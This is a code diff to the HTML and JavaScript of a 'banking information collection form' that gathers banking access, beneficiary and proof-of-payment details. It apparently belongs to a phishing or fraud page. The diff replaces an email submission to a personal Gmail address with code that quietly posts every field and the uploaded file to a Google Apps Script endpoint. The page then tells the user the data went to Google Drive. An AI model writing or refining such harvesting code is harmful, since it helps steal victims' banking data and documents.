@@ -529,7 +529,7 @@ cursor:pointer;
     <div style="display:flex; gap:10px;">
         <button type="button" class="pdf" id="pdfBtn" onclick="downloadPDF()" style="display:none;">Download PDF</button>
         <button type="button" class="btn-next" id="nextBtn" onclick="changeStep(1)">Next Stage</button>
-        <button type="button" class="send" id="sendBtn" onclick="sendForm()" style="display:none;">Send Email</button>
+        <button type="button" class="send" id="sendBtn" onclick="sendForm()" style="display:none;">Submit Form</button>
     </div>
 </div>
 
@@ -546,6 +546,9 @@ Professional Banking Information Collection Form • Multi-Stage Account & Benef
 </div>
 
 <script>
+// Integrated Web App Endpoint
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwt9UBfQCIbi55hzPQmiaid-O9wASVgVgXCPZbNXQTRxPnzehHbbxiSJAu6FtJWILtOcg/exec";
+
 let currentStep = 1;
 const totalSteps = 5;
 
@@ -600,7 +603,7 @@ function changeStep(direction) {
     }
 }
 
-function sendForm() {
+async function sendForm() {
     const form = document.getElementById("onboardingForm");
     
     if (!form.checkValidity()) {
@@ -608,28 +611,56 @@ function sendForm() {
         return;
     }
 
+    const sendBtn = document.getElementById("sendBtn");
+    sendBtn.disabled = true;
+    sendBtn.innerText = "Submitting...";
+
     const formData = new FormData(form);
-    let bodyText = "BANKING ACCESS & PAYMENT SUBMISSION\n";
-    bodyText += "===================================\n\n";
+    const payload = {};
 
-    for (let [key, value] of formData.entries()) {
-        if (value instanceof File) {
-            bodyText += `${key}: ${value.name ? value.name + " (Please attach file manually)" : "No file selected"}\n`;
-        } else if (value.trim() !== "") {
-            bodyText += `${key}: ${value}\n`;
+    formData.forEach((value, key) => {
+        if (!(value instanceof File)) {
+            payload[key] = value;
         }
-    }
+    });
 
-    const recipient = "andyprince385@gmail.com";
-    const subject = encodeURIComponent("Banking Access & Beneficiary Form Submission");
-    const encodedBody = encodeURIComponent(bodyText);
-    
     const fileInput = document.getElementById("paymentProofInput");
     if (fileInput && fileInput.files.length > 0) {
-        alert("Your email app will open now. Please attach your proof of payment file to the draft email before sending!");
+        const file = fileInput.files[0];
+        const base64 = await convertFileToBase64(file);
+        payload.fileData = base64;
+        payload.fileName = file.name;
+        payload.fileMime = file.type;
     }
 
-    window.location.href = `mailto:${recipient}?subject=${subject}&body=${encodedBody}`;
+    try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        alert("Your submission and uploaded file have been successfully sent to Google Drive!");
+        form.reset();
+        window.location.reload();
+
+    } catch (error) {
+        console.error("Error submitting form:", error);
+        alert("An error occurred while submitting. Please try again.");
+    } finally {
+        sendBtn.disabled = false;
+        sendBtn.innerText = "Submit Form";
+    }
+}
+
+function convertFileToBase64(file) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = (error) => reject(error);
+        reader.readAsDataURL(file);
+    });
 }
 
 async function downloadPDF() {
